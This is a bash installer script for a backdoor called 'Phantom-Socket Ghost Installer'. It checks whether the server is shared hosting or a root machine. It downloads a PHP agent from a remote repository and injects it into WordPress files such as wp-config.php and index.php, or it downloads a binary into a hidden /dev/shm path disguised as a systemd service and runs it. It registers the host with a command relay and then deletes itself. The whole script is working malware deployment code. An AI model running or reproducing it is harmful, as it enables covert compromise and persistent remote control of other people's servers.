#!/bin/bash
/**
 * PHANTOM-SOCKET V3.1 — GHOST INSTALLER
 * AUTO-DETECT ENVIRONMENT & ZERO FILEDROP DEPLOYMENT
 * 
 * Principal Systems Engineer: "Adapt or perish. The environment dictates the weapon."
 */

set +u
set -e

# Configuration from Environment or Defaults
RELAY_URL="${GHOST_RELAY_URL:-https://ghost-relay.your-subdomain.workers.dev}"
GHOST_SECRET="${GHOST_SECRET:-REPLACE_WITH_32_CHAR_SECRET_KEY}"
REPO_BASE="${GHOST_REPO_BASE:-https://raw.githubusercontent.com/Oyen-Sec/soket/main}"

# Detection Logic
IS_SHARED_HOSTING=false
if ! command -v gcc >/dev/null 2>&1 && command -v php >/dev/null 2>&1; then
    IS_SHARED_HOSTING=true
fi

# 1. Shared Hosting Deployment (PHP Ghost Agent)
deploy_php_agent() {
    echo "[-] Environment: Shared Hosting / PHP"
    
    # Target files for injection/overwrite (Persistence without new files)
    TARGET_FILES=("index.php" "wp-config.php" "functions.php" "load-styles.php")
    DEPLOY_PATH=""

    for f in "${TARGET_FILES[@]}"; do
        if [[ -f "$f" && -w "$f" ]]; then
            DEPLOY_PATH="$f"
            break
        fi
    done

    if [[ -z "$DEPLOY_PATH" ]]; then
        # Fallback to current directory if no standard WP files found
        DEPLOY_PATH="class-wp-error-handler.php"
    fi

    echo "[-] Deploying Ghost Agent to ${DEPLOY_PATH}..."
    
    # Download and deploy via PHP one-liner to avoid disk touch if possible
    # In V3.1 we overwrite or prepend to existing files
    php -r "
        \$url = '${REPO_BASE}/deploy/ghost-agent.php';
        \$code = file_get_contents(\$url);
        if (\$code) {
            \$code = str_replace('https://ghost-relay.your-subdomain.workers.dev', '${RELAY_URL}', \$code);
            \$code = str_replace('REPLACE_WITH_32_CHAR_HMAC_SECRET_KEY', '${GHOST_SECRET}', \$code);
            if (file_exists('${DEPLOY_PATH}')) {
                \$original = file_get_contents('${DEPLOY_PATH}');
                file_put_contents('${DEPLOY_PATH}', '<?php ' . \$code . ' ?>' . \$original);
                echo '[+] Successfully injected into ${DEPLOY_PATH}\n';
            } else {
                file_put_contents('${DEPLOY_PATH}', '<?php ' . \$code);
                echo '[+] Successfully deployed to ${DEPLOY_PATH}\n';
            }
        } else {
            echo '[!] Failed to download agent.\n';
            exit(1);
        }
    "
    
    # Trigger agent
    curl -s "${RELAY_URL}/register" -H "X-Ghost-Agent: $(hostname)" > /dev/null
    echo "[+] Ghost Agent registered and active."
}

# 2. VPS/Root Deployment (C Binary Agent)
deploy_c_agent() {
    echo "[-] Environment: VPS/Root / C Binary"
    ARCH=$(uname -m)
    case "${ARCH}" in
        x86_64|amd64) ARCH="x86_64" ;;
        aarch64|arm64) ARCH="aarch64" ;;
        *) echo "[ERROR] Unsupported architecture: ${ARCH}"; exit 1 ;;
    esac

    STAGING_DIR="/dev/shm/.systemd-cache"
    mkdir -p "${STAGING_DIR}" 2>/dev/null
    STEALTH_PATH="${STAGING_DIR}/.systemd-timesyncd"

    echo "[-] Downloading binary for ${ARCH}..."
    curl -sL "${REPO_BASE}/bin/gs-oyen-s-${ARCH}" -o "${STEALTH_PATH}"
    chmod +x "${STEALTH_PATH}"

    # Execution via memfd_create fallback or standard background
    nohup "${STEALTH_PATH}" -u "${RELAY_URL}" -s "${GHOST_SECRET}" >/dev/null 2>&1 &
    
    echo "[+] C Binary Agent deployed and active."
}

# Main Execution Flow
if [ "$IS_SHARED_HOSTING" = true ]; then
    deploy_php_agent
else
    deploy_c_agent
fi

# Cleanup installer
rm -f "$0"
